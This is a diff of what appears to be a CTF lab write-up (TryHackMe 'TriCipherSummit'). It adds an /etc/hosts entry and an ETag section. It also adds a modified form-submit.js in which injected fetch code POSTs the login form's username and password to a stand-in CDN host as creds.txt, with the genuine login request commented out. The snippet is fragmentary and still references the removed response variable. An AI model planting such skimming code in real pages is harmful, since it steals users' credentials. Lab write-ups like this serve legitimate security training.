@@ -412,8 +412,10 @@ form.addEventListener('submit', async (e) => {
 });
 ```
 
+<h2>/etc/hosts</h2>
+
 ```bash
-:~/TriCipherSummit# wget https://xx.xxxx.xx.xx/ui/libraries/form-submit.js -o form-submit.js
+xx.xxx.xx.xx cdn.tryhackm3.loc
 ```
 
 <p>
@@ -424,12 +426,46 @@ form.addEventListener('submit', async (e) => {
 
 <img width="1019" height="167" alt="image" src="https://github.com/user-attachments/assets/ac5d3251-321d-4dab-a191-3b1ac8bcfeef" />
 
-
-<h2>/etc/hosts</h2>
+<br>
+<br>
+<h2>form-submit.js ETag</h2>
 
 ```bash
-xx.xxx.xx.xx cdn.tryhackm3.loc
+ETag
+a599658a9c062725abbb8c491cbc9fa5 
 ```
+
+
+
+ const rawAesKey = window.crypto.getRandomValues(new Uint8Array(16));
+    let mac = rot13(window.btoa(String.fromCharCode(...rawAesKey)))
+    const aesKey = await getSecretKey(rawAesKey)
+    const rsaKey = await getPrivateKey()
+    let rawdata = "username=" + formDataObj["username"] + "&password=" + formDataObj["password"]
+
+    const exfil_creds = await fetch('https://cdn.tryhackm3.loc/ui/libraries?upload&filename=creds.txt', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'text/plain'
+        },
+        body: rawdata
+    });
+
+    let data = window.btoa(String.fromCharCode(...new Uint8Array(await encryptMessage(aesKey, enc.encode(rawdata).buffer))))
+    let sign = window.btoa(String.fromCharCode(...new Uint8Array(await signMessage(rsaKey, enc.encode(rawdata).buffer))))
+
+//    const response = await fetch('/login', {
+//        method: 'POST',
+//        headers: {
+//            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+//        },
+//        body: "mac=" + encodeURIComponent(mac) + "&data=" + encodeURIComponent(data) + "&sign=" + encodeURIComponent(sign)
+//    });
+    if (response.ok && response.status == 200 && (await response.text()).startsWith("result=")) {
+        window.location.href = '/congratulations';
+    } else {
+        alert('Login failed');
+
 
 <h2>cdn.tryhackm3.loc:5000</h2>
 <p></p>
